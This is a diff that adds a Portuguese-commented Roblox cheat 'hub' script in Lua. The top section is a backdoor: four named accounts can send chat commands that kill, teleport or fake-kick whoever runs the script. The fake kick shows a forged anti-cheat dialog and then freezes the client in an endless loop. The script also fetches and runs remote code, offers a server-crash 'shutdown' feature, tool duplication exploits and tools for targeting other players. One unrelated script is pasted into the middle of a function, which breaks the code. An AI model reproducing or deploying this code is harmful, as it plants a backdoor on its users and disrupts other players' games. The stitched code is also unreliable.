@@ -1,1 +1,1027 @@
-# adm-do-aham-hub-nn-vou-obfuscar-por-pregui-a-kakakka
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
+
+local localPlayer = Players.LocalPlayer
+
+-- Usuários autorizados
+local allowedUsers = {
+	["alodozhynn"] = true,
+	["n9xgh"] = true,
+	["JustWX99s"] = true,
+	["ajudo_pessoas21"] = true
+}
+
+local loopKill = false
+local loopTarget = nil
+local loopInitiatorUserId = nil
+
+-- Kick falso com UI personalizada
+local function KickLocalPlayer(message)
+	local Blur = Instance.new("BlurEffect")
+	Blur.Parent = game.Lighting
+	Blur.Size = 24
+	Blur.Enabled = true
+
+	local ScreenGui = Instance.new("ScreenGui")
+	local promptOverlay = Instance.new("Frame")
+	local ErrorPrompt = Instance.new("Frame")
+	local PromptLayout = Instance.new("UIListLayout")
+	local PromptScale = Instance.new("UIScale")
+	local TitleFrame = Instance.new("Frame")
+	local TitleFramePadding = Instance.new("UIPadding")
+	local ErrorTitle = Instance.new("TextLabel")
+	local SplitLine = Instance.new("Frame")
+	local MessageArea = Instance.new("Frame")
+	local MessageAreaPadding = Instance.new("UIPadding")
+	local ErrorFrame = Instance.new("Frame")
+	local ErrorFrameLayout = Instance.new("UIListLayout")
+	local ErrorMessage = Instance.new("TextLabel")
+	local ButtonArea = Instance.new("Frame")
+	local ButtonLayout = Instance.new("UIGridLayout")
+	local LeaveButton = Instance.new("ImageButton")
+	local ButtonText = Instance.new("TextLabel")
+	local UICorner = Instance.new("UICorner")
+	local ShimmerFrame = Instance.new("ImageLabel")
+	local Shimmer = Instance.new("ImageLabel")
+	local ShimmerOverlay = Instance.new("ImageLabel")
+
+	ScreenGui.Parent = localPlayer:WaitForChild("PlayerGui")  
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  
+
+	promptOverlay.Name = "promptOverlay"
+	promptOverlay.Parent = ScreenGui
+	promptOverlay.Active = true
+	promptOverlay.BackgroundTransparency = 1
+	promptOverlay.Position = UDim2.new(0, 0, 0, -36)
+	promptOverlay.Size = UDim2.new(1, 0, 1, 36)
+
+	ErrorPrompt.Name = "ErrorPrompt"
+	ErrorPrompt.Parent = promptOverlay
+	ErrorPrompt.AnchorPoint = Vector2.new(0.5, 0.5)
+	ErrorPrompt.BackgroundColor3 = Color3.fromRGB(57, 59, 61)
+	ErrorPrompt.Position = UDim2.new(0.5, 0, 0.5, 0)
+	ErrorPrompt.Size = UDim2.new(0, 400, 0, 208)
+	ErrorPrompt.ZIndex = 8
+
+	PromptLayout.Parent = ErrorPrompt
+	PromptLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	PromptLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+	PromptScale.Parent = ErrorPrompt
+
+	TitleFrame.Parent = ErrorPrompt
+	TitleFrame.BackgroundTransparency = 1
+	TitleFrame.LayoutOrder = 1
+	TitleFrame.Size = UDim2.new(1, 0, 0, 50)
+	TitleFrame.ZIndex = 8
+
+	TitleFramePadding.Parent = TitleFrame
+	TitleFramePadding.PaddingBottom = UDim.new(0, 11)
+	TitleFramePadding.PaddingTop = UDim.new(0, 11)
+
+	ErrorTitle.Parent = TitleFrame
+	ErrorTitle.BackgroundTransparency = 1
+	ErrorTitle.Size = UDim2.new(1, 0, 0, 28)
+	ErrorTitle.ZIndex = 8
+	ErrorTitle.Font = Enum.Font.SourceSansSemibold
+	ErrorTitle.Text = "Disconnected"
+	ErrorTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+	ErrorTitle.TextSize = 25
+
+	SplitLine.Parent = ErrorPrompt
+	SplitLine.BackgroundColor3 = Color3.fromRGB(189, 190, 190)
+	SplitLine.BorderSizePixel = 0
+	SplitLine.LayoutOrder = 2
+	SplitLine.Size = UDim2.new(1, -40, 0, 1)
+	SplitLine.ZIndex = 8
+
+	MessageArea.Parent = ErrorPrompt
+	MessageArea.BackgroundTransparency = 1
+	MessageArea.LayoutOrder = 3
+	MessageArea.Size = UDim2.new(1, 0, 1, -51)
+	MessageArea.ZIndex = 8
+
+	MessageAreaPadding.Parent = MessageArea
+	MessageAreaPadding.PaddingBottom = UDim.new(0, 20)
+	MessageAreaPadding.PaddingLeft = UDim.new(0, 20)
+	MessageAreaPadding.PaddingRight = UDim.new(0, 20)
+	MessageAreaPadding.PaddingTop = UDim.new(0, 20)
+
+	ErrorFrame.Parent = MessageArea
+	ErrorFrame.BackgroundTransparency = 1
+	ErrorFrame.Size = UDim2.new(1, 0, 1, 0)
+	ErrorFrame.ZIndex = 8
+
+	ErrorFrameLayout.Parent = ErrorFrame
+	ErrorFrameLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	ErrorFrameLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	ErrorFrameLayout.Padding = UDim.new(0, 20)
+
+	ErrorMessage.Parent = ErrorFrame
+	ErrorMessage.BackgroundTransparency = 1
+	ErrorMessage.LayoutOrder = 1
+	ErrorMessage.Size = UDim2.new(1, 0, 1, -56)
+	ErrorMessage.ZIndex = 8
+	ErrorMessage.Font = Enum.Font.SourceSans
+	ErrorMessage.Text = message or "Você foi expulso pelo Hyperion anti-cheat por segurança. (Código de erro: 236)"
+	ErrorMessage.TextColor3 = Color3.fromRGB(189, 190, 190)
+	ErrorMessage.TextSize = 20
+	ErrorMessage.TextWrapped = true
+
+	ButtonArea.Parent = ErrorFrame
+	ButtonArea.BackgroundTransparency = 1
+	ButtonArea.LayoutOrder = 2
+	ButtonArea.Size = UDim2.new(1, 0, 0, 36)
+	ButtonArea.ZIndex = 8
+
+	ButtonLayout.Parent = ButtonArea
+	ButtonLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	ButtonLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	ButtonLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+	ButtonLayout.CellPadding = UDim2.new(0, 10, 0, 0)
+	ButtonLayout.CellSize = UDim2.new(0, 360, 0, 36)
+
+	LeaveButton.Parent = ButtonArea
+	LeaveButton.AnchorPoint = Vector2.new(0.5, 0.5)
+	LeaveButton.BackgroundTransparency = 1
+	LeaveButton.LayoutOrder = 1
+	LeaveButton.Size = UDim2.new(1, 0, 1, 0)
+	LeaveButton.ZIndex = 8
+
+	ButtonText.Parent = LeaveButton
+	ButtonText.BackgroundColor3 = Color3.fromRGB(252, 250, 255)
+	ButtonText.Size = UDim2.new(1, 0, 1, 0)
+	ButtonText.ZIndex = 8
+	ButtonText.Font = Enum.Font.SourceSans
+	ButtonText.Text = "Leave"
+	ButtonText.TextColor3 = Color3.fromRGB(35, 37, 39)
+	ButtonText.TextSize = 20
+
+	UICorner.Parent = ButtonText
+
+	ShimmerFrame.Parent = LeaveButton
+	ShimmerFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	ShimmerFrame.BackgroundTransparency = 0.7
+	ShimmerFrame.Size = UDim2.new(1, 0, 1, 0)
+	ShimmerFrame.Visible = false
+	ShimmerFrame.ZIndex = 8
+
+	Shimmer.Parent = ShimmerFrame
+	Shimmer.BackgroundTransparency = 1
+	Shimmer.Position = UDim2.new(-1, 0, 0, 0)
+	Shimmer.Size = UDim2.new(1, 0, 2, 0)
+	Shimmer.ZIndex = 8
+
+	ShimmerOverlay.Parent = ShimmerFrame
+	ShimmerOverlay.BackgroundTransparency = 1
+	ShimmerOverlay.Size = UDim2.new(1, 0, 1, 0)
+	ShimmerOverlay.ZIndex = 9
+	ShimmerOverlay.ImageColor3 = Color3.fromRGB(57, 59, 61)
+
+	task.wait(0.2)
+	while true do end
+end
+
+-- Loop de execução contínua de mortes
+RunService.RenderStepped:Connect(function()
+	if not loopKill or not loopTarget then return end
+	if localPlayer.UserId == loopInitiatorUserId then return end
+
+	local char = localPlayer.Character
+	if not char then return end
+
+	local humanoid = char:FindFirstChildOfClass("Humanoid")
+	if not humanoid then return end
+
+	if loopTarget == "all" then
+		humanoid.Health = 0
+	elseif localPlayer.Name:sub(1, #loopTarget):lower() == loopTarget then
+		humanoid.Health = 0
+	end
+end)
+
+-- Manipulador de comandos via chat
+TextChatService.OnIncomingMessage = function(message)
+	local text = message.Text:lower()
+	if not message.TextSource then return end
+
+	local senderUserId = message.TextSource.UserId
+	local success, senderName = pcall(function()
+		return Players:GetNameFromUserIdAsync(senderUserId)
+	end)
+	if not success or not allowedUsers[senderName] then return end
+
+	local isFromSelf = (senderUserId == localPlayer.UserId)
+
+	local function startsWith(name, prefix)
+		return name:sub(1, #prefix):lower() == prefix
+	end
+
+	if text:sub(1, 6) == "/kill " then
+		local arg = text:sub(7):lower()
+		if arg == "all" and not isFromSelf then
+			local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
+			if humanoid then humanoid.Health = 0 end
+		elseif startsWith(localPlayer.Name, arg) then
+			local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
+			if humanoid then humanoid.Health = 0 end
+		end
+
+	elseif text:sub(1, 10) == "/loopkill " then
+		local arg = text:sub(11):lower()
+		if arg == "all" or arg ~= "" then
+			loopKill = true
+			loopTarget = arg
+			loopInitiatorUserId = senderUserId
+		end
+
+	elseif text == "/unloopkill" then
+		loopKill = false
+		loopTarget = nil
+		loopInitiatorUserId = nil
+
+	elseif text:sub(1, 6) == "/kick " then
+		local arg = text:sub(7):lower()
+		if arg == "all" and not isFromSelf then
+			KickLocalPlayer()
+		elseif startsWith(localPlayer.Name, arg) then
+			KickLocalPlayer()
+		end
+
+	elseif text:sub(1, 7) == "/bring " then
+		local arg = text:sub(8):lower()
+		if isFromSelf then return end 
+		local initiator = Players:GetPlayerByUserId(senderUserId)
+		if not initiator then return end
+
+		local initiatorChar = initiator.Character
+		if not initiatorChar then return end
+
+		local initiatorHRP = initiatorChar:FindFirstChild("HumanoidRootPart")
+		if not initiatorHRP then return end
+
+		local function bringPlayer(plr)
+			local char = plr.Character
+			if not char then return end
+
+			local hrp = char:FindFirstChild("HumanoidRootPart")
+			if not hrp then return end
+
+			if plr.UserId == senderUserId then return end
+
+			hrp.CFrame = initiatorHRP.CFrame + Vector3.new(0, 1, 0)
+		end
+
+		if arg == "all" then
+			if localPlayer.UserId ~= senderUserId and (localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")) then
+				bringPlayer(localPlayer)
+			end
+		else
+			if startsWith(localPlayer.Name, arg) then
+				bringPlayer(localPlayer)
+			end
+		end
+	end
+end
+
+--[[
+WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+
+local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/Library-ui/refs/heads/main/Redzhubui"))()
+
+local Window = redzlib:MakeWindow({
+Title = "Nytherune testing ambiente seguro!",
+SubTitle = "by Wx",
+SaveFolder = "testando | redz lib v5.lua"
+})
+
+Window:AddMinimizeButton({
+Button = { Image = "rbxassetid://71014873973869", BackgroundTransparency = 0 },
+Corner = { CornerRadius = UDim.new(35, 1) },
+})
+
+local Tab1 = Window:MakeTab({"Um", "cherry"})
+
+Window:SelectTab(Tab1)
+
+local Section = Tab1:AddSection({"Section"})
+
+local Paragraph = Tab1:AddParagraph({"oi", "isso e um paragrafo,,,,!!!!! a "})
+
+
+-- Shutdown Servidor Section
+local Section = Tab1:AddSection({
+    Name = "Shutdown Servidor"
+})
+
+-- Toggle State for Lag FireX
+local toggles = { LagFireX = false }
+
+-- Services
+local RunService = game:GetService("RunService")
+local VirtualUser = game:GetService("VirtualUser")
+
+-- Function to Simulate Normal Click
+local function clickNormally(object)
+    local clickDetector = object:FindFirstChildWhichIsA("ClickDetector")
+    if clickDetector then
+        fireclickdetector(clickDetector)
+    end
+end
+
+-- Function to Lag Game with FireX using Heartbeat
+local function lagarJogoFireX(fireXPath, maxTeleports)
+    if fireXPath then
+        local teleportCount = 0
+        local connection
+        connection = RunService.Heartbeat:Connect(function()
+            if not toggles.LagFireX or teleportCount >= maxTeleports then
+                connection:Disconnect()
+                return
+            end
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = fireXPath.CFrame
+            clickNormally(fireXPath)
+            teleportCount = teleportCount + 1
+        end)
+
+        -- Após 5 minutos, parar tudo e crashar o servidor
+        task.delay(300, function()
+            if toggles.LagFireX then
+                -- Para o loop inicial
+                toggles.LagFireX = false
+                connection:Disconnect()
+
+                -- Teleporta para (0, 5, 0)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 5, 0)
+-- LocalScript: EquipToggle.lua
+-- Coloque em StarterPlayer > StarterPlayerScripts
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+
+local function moveAllTools()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local backpack = player:WaitForChild("Backpack")
+
+    for _, tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            tool.Parent = character
+        end
+    end
+end
+
+-- Executa inicialmente
+moveAllTools()
+
+-- Alterna equipar/desequipar
+local function toggleEquip(tool)
+    while tool.Parent do
+        -- Equipa
+        tool.Parent = player.Character
+        task.wait(1) -- espera 1 segundo
+
+        -- Desequipa
+        tool.Parent = player:WaitForChild("Backpack")
+        task.wait(1) -- espera 1 segundo
+    end
+end
+
+-- Aplica toggle a todas as ferramentas existentes
+for _, tool in ipairs(player.Backpack:GetChildren()) do
+    if tool:IsA("Tool") then
+        spawn(function()
+            toggleEquip(tool)
+        end)
+    end
+end
+
+-- Aplica toggle para novas ferramentas adicionadas
+player.Backpack.ChildAdded:Connect(function(tool)
+    if tool:IsA("Tool") then
+        spawn(function()
+            toggleEquip(tool)
+        end)
+    end
+end)
+                -- Simulação de clique infinito na tela com Heartbeat
+                local clickConnection
+                clickConnection = RunService.Heartbeat:Connect(function()
+                    VirtualUser:CaptureController()
+                    VirtualUser:CaptureController()
+VirtualUser:Button1Down(Vector2.new(500, 500), workspace.CurrentCamera.CFrame)
+                end)
+            end
+        end)
+    else
+        warn("FireX não encontrado.")
+    end
+end
+
+-- Shutdown Servidor Toggle
+Tab1:AddToggle({
+    Name = "[🔥 New Method] Shutdown Server!",
+    Default = false,
+    Callback = function(state)
+        toggles.LagFireX = state
+        if state then
+            local fireXPath = workspace:FindFirstChild("WorkspaceCom"):FindFirstChild("001_GiveTools"):FindFirstChild("FireX")
+            if fireXPath then
+                lagarJogoFireX(fireXPath, 999999999)
+            else
+                warn("FireX não encontrado.")
+            end
+        else
+            print("Shutdown Servidor desativado.")
+        end
+    end
+})
+local TrollTab = Window:MakeTab({ Title = "Scripts Trolls", Icon = "rbxassetid://13364900349" })
+local Section = TrollTab:AddSection({"Skybox (pra alterar mude sua camisa!)"})
+TrollTab:AddButton({
+   Name = "[🌫] Aplicar Skybox da sua camisa (não visual)",
+   Callback = function()
+local args = {
+    {
+        100839513065432
+    }
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer(unpack(args))
+function missing(t, f, fallback)
+    if type(f) == t then return f end
+    return fallback 
+end
+
+cloneref = missing("function", cloneref, function(...) return ... end)
+local Services = setmetatable({}, {
+    __index = function(_, name)
+        return cloneref(game:GetService(name))
+    end
+})
+
+local Players = Services.Players
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+
+player.CharacterAdded:Connect(function(newCharacter)
+    character = newCharacter
+    humanoid = character:WaitForChild("Humanoid")
+end)
+
+-- ConfiguraÃ§Ãµes
+local Settings = {}
+Settings["Fade In"]     = 0.1
+Settings["Fade Out"]    = 0.1
+Settings["Weight"]      = 1
+Settings["Speed"]       = 1
+Settings["Time Position"] = 0
+
+local CurrentTrack
+
+local function LoadTrack(id)
+    if CurrentTrack then 
+        CurrentTrack:Stop(0) 
+    end
+
+    local animId
+    local ok, result = pcall(function()
+        return game:GetObjects("rbxassetid://" .. tostring(id))
+    end)
+
+    if ok and result and #result > 0 then
+        local anim = result[1]
+        if anim:IsA("Animation") then
+            animId = anim.AnimationId
+        else
+            animId = "rbxassetid://" .. tostring(id)
+        end
+    else
+        animId = "rbxassetid://" .. tostring(id)
+    end
+
+    local newAnim = Instance.new("Animation")
+    newAnim.AnimationId = animId
+    local newTrack = humanoid:LoadAnimation(newAnim)
+    newTrack.Priority = Enum.AnimationPriority.Action4
+
+    local weight = Settings["Weight"]
+    if weight == 0 then weight = 0.001 end
+
+    newTrack:Play(Settings["Fade In"], weight, Settings["Speed"])
+    
+    CurrentTrack = newTrack
+    CurrentTrack.TimePosition = math.clamp(Settings["Time Position"], 0, 1) * CurrentTrack.Length
+
+    return newTrack
+end
+
+-- Executa automaticamente o emote desejado
+local EmoteId = 139092694533784
+LoadTrack(EmoteId)
+end})
+
+
+
+local ToolsTab = Window:MakeTab({"Itens [ Update! ]", "backpack"})
+
+
+    
+local SectionDupl = ToolsTab:AddSection({
+    Name = "Duplicate Laptops"
+})
+ToolsTab:AddButton({
+    Name = "Duplicate Laptops (Required for Some Things)",
+    Callback = function()
+-- Função para simular clique normal
+local function clickNormally(object)
+    local clickDetector = object:FindFirstChildWhichIsA("ClickDetector")
+    if clickDetector then
+        fireclickdetector(clickDetector)
+    end
+end
+
+-- Encontrar o laptop
+local laptop = workspace:FindFirstChild("WorkspaceCom")
+if laptop then
+    laptop = laptop:FindFirstChild("001_GiveTools")
+    if laptop then
+        laptop = laptop:FindFirstChild("Laptop")
+    end
+end
+
+if laptop then
+    local player = game.Players.LocalPlayer
+    local character = player.Character
+    if character and character:FindFirstChild("HumanoidRootPart") then
+        local startTime = tick()  -- Marca o tempo de início
+        while tick() - startTime < 60 do  -- Loop por 60 segundos
+            -- Teleportar para o laptop
+            character.HumanoidRootPart.CFrame = laptop.CFrame
+            -- Clicar continuamente
+            clickNormally(laptop)
+            -- Delay para evitar crash
+            task.wait(0.25)
+        end
+
+        -- Desequipar todas as ferramentas, mantendo-as no inventário
+        local backpack = player:FindFirstChildOfClass("Backpack")
+        if backpack then
+            for _, tool in ipairs(character:GetChildren()) do
+                if tool:IsA("Tool") then
+                    tool.Parent = backpack  -- Move a ferramenta da mão para o inventário
+                end
+            end
+        end
+
+        print("Parou de clicar após 60 segundos e ferramentas foram desequipadas.")
+    else
+        warn("HumanoidRootPart não encontrado.")
+    end
+else
+    warn("Laptop não encontrado.")
+end
+end
+})
+
+-- Referências aos remotes
+local cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s")
+local picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
+
+-- Seção de controle de itens
+local Section = ToolsTab:AddSection({
+    Name = "Items Control"
+})
+
+-- Botão para limpar todas as ferramentas
+ToolsTab:AddButton({
+    Name = "Clear All Tools",
+    Callback = function()
+        local args = {
+            [1] = "ClearAllTools"
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args))
+    end
+})
+
+-- Seção para equipar itens
+Section = ToolsTab:AddSection({
+    Name = "Equip Items"
+})
+
+-- Botão para equipar todos os itens
+ToolsTab:AddButton({
+    Name = "Equipar todos os itens",
+    Callback = function()
+        for _, tool in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
+            if tool:IsA("Tool") then
+                tool.Parent = game.Players.LocalPlayer.Character
+            end
+        end
+    end
+})
+
+-- Seção para Testes
+Section = ToolsTab:AddSection({
+    Name = "Super Aura Things/Tools"
+})
+
+
+
+
+
+                          
+-- Botão para Super Aura Smoke
+ToolsTab:AddButton({
+    Name = "Super Aura Smoke [ NEW ! ]",
+    Description = "A aura vai aparecer se vc segurar a tela, aí a fumaça vai aparecendo!",
+    Callback = function()
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Caminho do FireX
+local fireXPath = workspace:FindFirstChild("WorkspaceCom") 
+    and workspace.WorkspaceCom:FindFirstChild("001_GiveTools") 
+    and workspace.WorkspaceCom["001_GiveTools"]:FindFirstChild("FireX")
+
+local nametools = "crystal nazi lel"
+local oldcframe = LocalPlayer.Character.HumanoidRootPart.CFrame
+local attempts = 57
+local delayBetweenClicks = 0.3
+
+-- Grip e Handle
+local gripBase = CFrame.new(-0.290086746, 0.0755810738, -0.0109872818, 0.0439560413, 0.509705901, -0.859225094, -0.0591450632, -0.857220173, -0.511542261, -0.997281134, 0.0733042806, -0.00753343105)
+local handleOffset = CFrame.new(2, 1, -3)
+
+-- Velocidade absurda de rotação (sempre)
+local rotSpeed = math.rad(3600) -- 3600°/s
+
+-- Função de clique na ferramenta
+local function clickTool(object)
+    local clickDetector = object:FindFirstChildWhichIsA("ClickDetector")
+    if clickDetector then
+        fireclickdetector(clickDetector)
+    end
+end
+
+-- Configura Grip e Handle
+local function setupTool(tool)
+    tool.Grip = gripBase
+    tool.Name = nametools
+
+    local handle = tool:FindFirstChild("Handle")
+    if handle then
+        local weld = handle:FindFirstChildWhichIsA("Motor6D")
+        if weld then weld:Destroy() end
+
+        -- HandleOffset fixo
+        RunService.RenderStepped:Connect(function()
+            if handle.Parent == LocalPlayer.Character then
+                handle.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * handleOffset
+            end
+        end)
+    end
+
+    tool.Parent = LocalPlayer.Character
+end
+
+-- Rotação contínua infinita
+RunService.RenderStepped:Connect(function(deltaTime)
+    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        hrp.CFrame = hrp.CFrame * CFrame.Angles(0, rotSpeed * deltaTime, 0)
+    end
+end)
+
+-- Função de duplicação do FireX
+local function dupeToolsFireX(fireXPath)
+    if not fireXPath then
+        warn("FireX não encontrado.")
+        return
+    end
+
+    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+
+    hrp.CFrame = fireXPath.CFrame
+
+    for i = 1, attempts do
+        clickTool(fireXPath)
+        task.wait(delayBetweenClicks)
+
+        local tool = LocalPlayer.Backpack:FindFirstChild("FireX")
+        if tool then
+            setupTool(tool)
+        end
+    end
+
+    hrp.CFrame = oldcframe
+end
+
+-- Executa o dupe
+dupeToolsFireX(fireXPath)
+    end
+})
+                                                                                                                        
+local SectionToolW = ToolsTab:AddSection({
+    Name = "Tool Writer (doesnt support more than 10 letters)"
+})
+
+ToolsTab:AddButton({
+    Name = "Tool Writer (10 Letters)",
+    Callback = function()
+if getgenv()._Running then
+    warn("Already running")
+    return
+end
+getgenv()._Running = true
+
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+
+local CHAR_MAP = {
+    ["A"] = {"01110","10001","10001","11111","10001","10001","10001"},
+    ["B"] = {"11110","10001","10001","11110","10001","10001","11110"},
+    ["C"] = {"01110","10001","10000","10000","10000","10001","01110"},
+    ["D"] = {"11110","10001","10001","10001","10001","10001","11110"},
+    ["E"] = {"11111","10000","10000","11110","10000","10000","11111"},
+    ["F"] = {"11111","10000","10000","11110","10000","10000","10000"},
+    ["G"] = {"01110","10001","10000","10111","10001","10001","01110"},
+    ["H"] = {"10001","10001","10001","11111","10001","10001","10001"},
+    ["I"] = {"111","010","010","010","010","010","111"},
+    ["J"] = {"00111","00010","00010","00010","10010","10010","01100"},
+    ["K"] = {"10001","10010","10100","11000","10100","10010","10001"},
+    ["L"] = {"10000","10000","10000","10000","10000","10000","11111"},
+    ["M"] = {"10001","11011","10101","10101","10001","10001","10001"},
+    ["N"] = {"10001","11001","10101","10011","10001","10001","10001"},
+    ["O"] = {"01110","10001","10001","10001","10001","10001","01110"},
+    ["P"] = {"11110","10001","10001","11110","10000","10000","10000"},
+    ["Q"] = {"01110","10001","10001","10001","10101","10010","01101"},
+    ["R"] = {"11110","10001","10001","11110","10100","10010","10001"},
+    ["S"] = {"01111","10000","10000","01110","00001","00001","11110"},
+    ["T"] = {"11111","00100","00100","00100","00100","00100","00100"},
+    ["U"] = {"10001","10001","10001","10001","10001","10001","01110"},
+    ["V"] = {"10001","10001","10001","10001","10001","01010","00100"},
+    ["W"] = {"10001","10001","10001","10101","10101","11011","10001"},
+    ["X"] = {"10001","01010","00100","00100","01010","10001","10001"},
+    ["Y"] = {"10001","10001","10001","01010","00100","00100","00100"},
+    ["Z"] = {"11111","00001","00010","00100","01000","10000","11111"},
+    [" "] = {"00000","00000","00000","00000","00000","00000","00000"},
+}
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TextToolGUI"
+screenGui.Parent = CoreGui
+screenGui.ResetOnSpawn = false
+
+local mainFrame = Instance.new("Frame", screenGui)
+mainFrame.Size = UDim2.new(0, 250, 0, 120)
+mainFrame.Position = UDim2.new(0.5, -125, 0.5, -60)
+mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+mainFrame.BorderSizePixel = 0
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
+
+local title = Instance.new("TextLabel", mainFrame)
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "Text Former"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 16
+title.TextColor3 = Color3.fromRGB(255, 50, 50)
+
+local textBox = Instance.new("TextBox", mainFrame)
+textBox.Size = UDim2.new(0.9, 0, 0, 30)
+textBox.Position = UDim2.new(0.05, 0, 0, 40)
+textBox.PlaceholderText = "Type here..."
+textBox.Text = ""
+textBox.TextSize = 14
+textBox.Font = Enum.Font.Gotham
+textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+textBox.TextColor3 = Color3.new(1,1,1)
+Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 6)
+
+local button = Instance.new("TextButton", mainFrame)
+button.Size = UDim2.new(0.9, 0, 0, 30)
+button.Position = UDim2.new(0.05, 0, 0, 80)
+button.Text = "Form Text"
+button.Font = Enum.Font.GothamBold
+button.TextSize = 14
+button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+button.TextColor3 = Color3.new(1,1,1)
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
+
+local function getTools()
+    local tools = {}
+    for _, c in ipairs({player.Backpack, player.Character}) do
+        for _, tool in ipairs(c:GetChildren()) do
+            if tool:IsA("Tool") then
+                table.insert(tools, tool)
+            end
+        end
+    end
+    return tools
+end
+
+local function formText(text)
+    local tools = getTools()
+    local gripMap = {}
+    local startPos = Vector3.new(0, -5, 0)
+    local pixelSize = Vector3.new(1.2, 1.2, 0)
+    local toolIndex = 1
+    local offsetX = 0
+
+    for i = 1, #text do
+        local char = text:sub(i,i):upper()
+        local map = CHAR_MAP[char]
+        if map then
+            for y = 1, #map do
+                for x = 1, #map[y] do
+                    if map[y]:sub(x,x) == "1" then
+                        local tool = tools[toolIndex]
+                        if tool then
+                            gripMap[tool] = CFrame.new(
+                                startPos.X + (offsetX + x - 1) * pixelSize.X,
+                                startPos.Y + (y - 1) * pixelSize.Y,
+                                startPos.Z
+                            )
+                            toolIndex += 1
+                        end
+                    end
+                end
+            end
+            offsetX += #map[1] + 1
+        end
+    end
+
+    for tool, grip in pairs(gripMap) do
+        tool.Grip = grip
+        tool.Parent = player.Character
+    end
+end
+
+button.MouseButton1Click:Connect(function()
+    if textBox.Text ~= "" then
+        formText(textBox.Text)
+    end
+end)
+
+do
+    local dragging, dragInput, dragStart, startPos
+    mainFrame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = mainFrame.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    mainFrame.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            mainFrame.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + delta.X,
+                startPos.Y.Scale, startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+end
+
+getgenv()._Running = false
+end
+})
+local function getPlayerList()
+        local players = Players:GetPlayers()
+        local playerNames = {}
+        for _, player in ipairs(players) do
+            if player ~= LocalPlayer then
+                table.insert(playerNames, player.Name)
+            end
+        end
+        return playerNames
+    end
+local Troll = Window:MakeTab({ "Troll plrs", "home" })
+local killDropdown = Troll:AddDropdown({
+        Name = "Select Player",
+        Options = getPlayerList(),
+        Default = "",
+        Callback = function(value)
+            selectedPlayerName = value
+            getgenv().Target = value
+        end
+    })
+
+    Troll:AddButton({
+        Name = "Update Player List",
+        Callback = function()
+            local tablePlayers = Players:GetPlayers()
+            local newPlayers = {}
+            if killDropdown and #tablePlayers > 0 then
+                for _, player in ipairs(tablePlayers) do
+                    if player.Name ~= LocalPlayer.Name then
+                        table.insert(newPlayers, player.Name)
+                    end
+                end
+                killDropdown:Set(newPlayers)
+                if selectedPlayerName and not Players:FindFirstChild(selectedPlayerName) then
+                    selectedPlayerName = nil
+                    getgenv().Target = nil
+                    killDropdown:SetValue("")
+                end
+            else
+            end
+        end
+    })
+
+    Troll:AddButton({
+        Name = "Teleport to Player",
+        Callback = function()
+            if not selectedPlayerName or not Players:FindFirstChild(selectedPlayerName) then
+                return
+            end
+            local character = LocalPlayer.Character
+            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
+            if not humanoidRootPart then
+                return
+            end
+
